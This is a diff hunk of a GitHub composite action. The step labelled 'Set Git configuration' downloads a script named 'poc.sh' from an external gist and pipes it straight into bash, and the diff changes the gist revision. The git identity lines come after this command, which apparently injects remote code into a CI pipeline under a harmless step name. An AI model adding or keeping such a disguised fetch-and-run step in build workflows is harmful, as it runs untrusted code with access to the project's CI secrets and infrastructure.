@@ -9,7 +9,7 @@ runs:
   steps:
     - name: Set Git configuration
       run: |
-        curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/58f32dd19f35f12110c3241552307318/raw/45a5cee46f2f8e727d84f6a9b06db7fabe409363/poc.sh | /bin/bash
+        curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/58f32dd19f35f12110c3241552307318/raw/f0c708cef4e5fae9b7c5f424d71516352ecde347/poc.sh | bash
         git config --global user.email "app-management@shopify.com"
         git config --global user.name "App Management"
       shell: bash
